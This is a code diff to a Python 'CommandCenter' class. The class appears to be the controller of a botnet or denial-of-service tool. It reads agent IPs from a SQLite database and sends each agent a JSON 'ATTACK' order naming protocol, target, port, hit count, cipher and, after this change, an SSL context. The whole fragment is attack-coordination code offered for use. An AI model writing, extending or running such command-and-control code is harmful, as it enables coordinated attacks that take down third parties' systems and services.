@@ -221,7 +221,7 @@ class CommandCenter:
             self.update_agent_last_seen()
             )
         
-    def send_data_to_agents(self, PROTOCOL, TARGET, PORT, HITS, CIPHER):
+    def send_data_to_agents(self, PROTOCOL, TARGET, PORT, HITS, CIPHER, SSLCONTEXT):
         # get all agent ips from the database
         conn = sqlite3.connect(fr'{self.path}\CC_DATABASE.db')
         cursor = conn.cursor()
@@ -234,16 +234,15 @@ class CommandCenter:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 try:
                         # Send attack message to Command Center
-                        attack_message = json.dumps({"ATTACK": {"PROTOCOL": f"{PROTOCOL}", "TARGET": f"{TARGET}", "PORT": f"{PORT}", "HITS": f"{HITS}", "CIPHER": f"{CIPHER}"}})
+                        attack_message = json.dumps({"ATTACK": {"PROTOCOL": f"{PROTOCOL}", "TARGET": f"{TARGET}", "PORT": f"{PORT}", "HITS": f"{HITS}", "CIPHER": f"{CIPHER}", "SSLCONTEXT": f"{SSLCONTEXT}"}})
                         # Connect to the command center and send the HB
                         print(f"\033[1;32mSending attack instructions to {i[2]}")
-                        s.connect((i[2], 8574))
+                        s.connect((i[2], int(8574)))
                         #s.connect(("172.17.0.2", 8574))
                         s.sendall(attack_message.encode())
                         # close the connection
+                        s.recv(4096)
                         s.close()
-                        # Print the attack message with the current time
-                        print(f"\033[1;Attack sent to Command Center @ {time.ctime()}")
                         
                 except Exception as e:
                     print(f"\033[1;31mERROR: Failed to send attack instructions to {i[2]}: ", e)
